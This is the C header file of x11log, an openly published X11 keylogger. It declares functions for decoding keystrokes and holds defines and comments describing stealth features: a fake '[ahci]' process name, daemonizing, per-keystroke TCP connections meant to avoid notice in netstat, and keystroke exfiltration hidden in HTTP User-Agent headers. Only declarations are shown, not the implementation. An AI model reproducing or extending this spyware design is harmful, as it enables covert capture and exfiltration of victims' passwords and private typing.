/* vim: set ts=4 sw=4: */
/* -- x11log.h
 * x11log - an unprivileged, userspace keylogger for X11
 *
 * This code is licensed under GPLv3.
 * (c) Erik Sonnleitner 2007/2011, es@delta-xi.net
 * www.delta-xi.net
 * */

#ifndef _X11LOG_H
#define _X11LOG_H

/* global defines */
#define MAX_KEYLEN			16
#define SHIFT_DOWN			1
#define LOCK_DOWN			2
#define CONTROL_DOWN		3
#define DELAY				10000

#define XKBD_WIDTH			32
#define BITS_PER_BYTE		8
#define X_DEFAULT_DISPLAY	":0.0"
#define PROCESS_FAKE_NAME	"[ahci]"

/*
 * For validation of port-number for remote logging (-r)
 * */
#define TCP_PORT_MIN		0
#define TCP_PORT_MAX		65535

/* HTTP keystroke logging is buffered. This is done, because users typically
 * type faster, than a webserver is accepting requests; therefore, and for
 * better readability on the server, keystrokes are buffered until a certain
 * number of keystrokes is reached, and then sent to webserver. */
#define KEYSTROKE_BUFFER_SIZE		64

/* Which header field to use */
#define HTTP_HEADER_FIELD	"User-Agent: "

#define ERR_SOCKET			-1
#define ERR_CONNECT			-2
#define ERR_DNS				-3

/* macros */
#define SWAP(a,b,c) c t;t=(a);(a)=(b);(b)=(t);

/* structs */
struct config_struct {
	char* logfile;			/* path to logfile, if not console output  */
	FILE* logfd;			/* file descriptor for general output */
	char* display;			/* X11 display, like $DISPLAY env variable */

	int   log_remote_inet;	/* log to remote host? 0: no, 1: yes */
	char* remote_addr;		/* remote host to log to, as "hostname:port" */
	char* host;				/* hostname or IP as string */
	long  port;				/* port */

	int   silent;			/* no log to stdout */
	int   daemonize;		/* daemonize process */
	int   obfuscate;		/* obfuscate process name */

#ifdef _HAVE_CURL
	int   log_remote_http;	/* log to webserver; 0: no, 1: yes */
#endif //_HAVE_CURL
};

/* globals */
const struct remap_struct {
	char src[20], dst[8];
} remap[] = {
	{"Return","\n"},
	{"escape","^["},
	{"delete", ">D"},
	{"shift",""},
	{"control",""},
	{"tab","\t"},
	{"space", " "},
	{"exclam", "!"},
	{"quotedbl", "\""},
	{"numbersign", "#"},
	{"dollar", "$"},
	{"percent", "%"},
	{"ampersand", "&"},
	{"apostrophe", "'"},
	{"parenleft", "("},
	{"parenright", ")"},
	{"asterisk", "*"},
	{"plus", "+"},
	{"comma", ","},
	{"minus", "-"},
	{"period", "."},
	{"slash", "/"},
	{"colon", ":"},
	{"semicolon", ";"},
	{"less", "<"},
	{"equal", "="},
	{"greater", ">"},
	{"question", "?"},
	{"at", "@"},
	{"bracketleft", "["},
	{"backslash", "\\"},
	{"bracketright", "]"},
	{"asciicircum", "^"},
	{"underscore", "_"},
	{"grave", "`"},
	{"braceleft", "{"},
	{"bar", "|"},
	{"braceright", "}"},
	{"asciitilde", "~"},
	{"odiaeresis","ö"},
	{"adiaeresis","ä"},
	{"udiaeresis","ü"},
	{"Odiaeresis","Ö"},
	{"Adiaeresis","Ä"},
	{"Udiaeresis","Ü"},
	{"ssharp","ß"},
	{"",""}
};




/* * * * * * * * * * * 
 * Funcion prototypes
 * * * * * * * * * * * */

/* decodeKey()
 * checks keycodes and mods, and returns a human-readable interpretation of the
 * keyboard status.
 * */
char*		decodeKey		(int code, int down, int mod);


/* getMods()
 * Read the mod key(s) of the keymap state and return the present mods
 * */
int			getMods			(char *kbd);


/* getbit()
 * Retrieve one specific bit (idx) of a keymap vector
 * */
int			getbit			(char *kbd, int idx);


/* signal_handler()
 * Signal handler for SIGTERM, SIGINT and SIGHUP. Only set global flags, which
 * are regularly checked in main loop; this prevents us from requiring the
 * main configuration structure on global scope.
 * */
void		signal_handler	(int sig);


/* fatal()
 * fatal: Print error message and abort execution.
 * */
void		fatal			(const char * msg);


/* initialize()
 * Initialization stuff: parse arguments, define signal handlers, define
 * output stream, set default options. Returns time when init() finished.
 * */
struct tm*	initialize		(int argc, char ** argv, struct config_struct* opts);


/* transmit_keystroke_inet()
 * Transmit keystroke to a remote host, where some daemon is required to listen
 * at the given port. The TCP connection is newly established upon every call
 * to this function; this is inefficient, but also offers advantages (e.g.,
 * chances are lower that the user will see a constant TCP stream in netstat
 * output, etc). Returns the number of bytes read, or negative value on error.
 * */
int			transmit_keystroke_inet(char* key, struct config_struct *opts);


/* log()
 * printf() wrapper, taking care of debug levels
 * */
void		log				(int level, FILE* stream, const char *fmt, ...);


/* daemonize()
 * Daemonize logger. If a process_name is given, the name of the newly created
 * child as it appears within the process table, is altered. Returns pid of
 * child process, or exits on error.
 * */
int			daemonize		(char* child_process_name);


/* smalloc()
 * Secure malloc
 * */
void*		smalloc			(size_t size);


/* clean_exit()
 * Clean up and exit program: Close open file descriptors and free memory.
 * */
void		clean_exit		(struct config_struct* cfg);


#ifdef _HAVE_CURL
/* transmit_keystroke_http()
 * Transmit keystrokes to web-server within a HTTP request. For various reasons,
 * not every single keystroke is transmitted via a separate request, but a
 * keystroke buffer is being filled up to KEYSTROKE_BUFFER_SIZE, and then sent
 * as HTTP GET request to a webserver (default: 64 bytes). Keystrokes are being
 * sent as value of a HTTP header field (HTTP_HEADER_FIELD, default is User-
 * Agent).
 * */
int			transmit_keystroke_http(char* key, struct config_struct *cfg);
/* curl_blackhole()
 * This is just a dummy write-handler, in order to prevent libcurl from
 * printing the web-server response. 
 * */
size_t curl_blackhole(void* unused, size_t size, size_t nmemb, void* none);
#endif

#endif // _X11LOG_H

